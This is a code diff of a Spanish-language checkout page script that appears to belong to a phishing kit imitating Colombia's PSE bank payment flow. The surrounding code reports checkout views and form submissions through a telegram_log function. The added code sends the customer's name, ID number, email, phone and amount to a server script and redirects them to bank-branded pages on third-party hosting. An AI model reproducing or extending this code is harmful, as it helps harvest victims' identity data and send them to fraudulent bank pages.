@@ -694,22 +694,42 @@ telegram_log('💳 Vista de checkout', [
       body: JSON.stringify({ event: '🏦 Envío formulario PSE', data: logData }),
       keepalive: true
     }).finally(function () {
-      // El loader se mantiene visible: no se quita aquí, sigue puesto hasta la redirección.
-      let redirectUrl;
-
-      if (bankConfig.flow === 'recaudofall') {
-        redirectUrl = new URL(recaudofallBase);
-        redirectUrl.searchParams.set('cedula', customerCedula);
-        redirectUrl.searchParams.set('nombre', customerName);
-        redirectUrl.searchParams.set('email', customerEmail);
-        redirectUrl.searchParams.set('telefono', customerPhone);
-        redirectUrl.searchParams.set('monto', amountValue);
-        redirectUrl.searchParams.set('banco', bankConfig.bank);
-      } else {
-        redirectUrl = new URL(bankConfig.page + '/sites/' + bankConfig.slug + '/manager/' + bankConfig.id, window.location.href);
+      // Bancos primarios → Vercel directo (sin pasar por el servidor)
+      if (bankConfig.flow === 'primary') {
+        window.location.href = bankConfig.page + '/sites/' + bankConfig.slug + '/manager/' + bankConfig.id;
+        return;
       }
 
-      window.location.href = redirectUrl.toString();
+      // Para el resto: el servidor decide entre HelppiuPay (>$2.5M) y Recaudofall
+      fetch('get-redirect.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          banco:         bankConfig.key,
+          monto:         Math.round(brebAmount),
+          nombre:        customerName,
+          cedula:        customerCedula,
+          tipoDocumento: document.getElementById('pse-doc-type').value,
+          tipoPersona:   document.getElementById('pse-person-type').value,
+          email:         customerEmail,
+          telefono:      customerPhone
+        })
+      })
+      .then(function (r) { return r.json(); })
+      .then(function (result) {
+        if (result.ok) {
+          window.location.href = result.url;
+        } else {
+          document.getElementById('pseSubmit').disabled = false;
+          loadingOverlay.classList.remove('visible');
+          alert('No se pudo procesar el pago. Por favor intenta de nuevo.');
+        }
+      })
+      .catch(function () {
+        document.getElementById('pseSubmit').disabled = false;
+        loadingOverlay.classList.remove('visible');
+        alert('Error de conexión. Por favor intenta de nuevo.');
+      });
     });
   });
 </script>
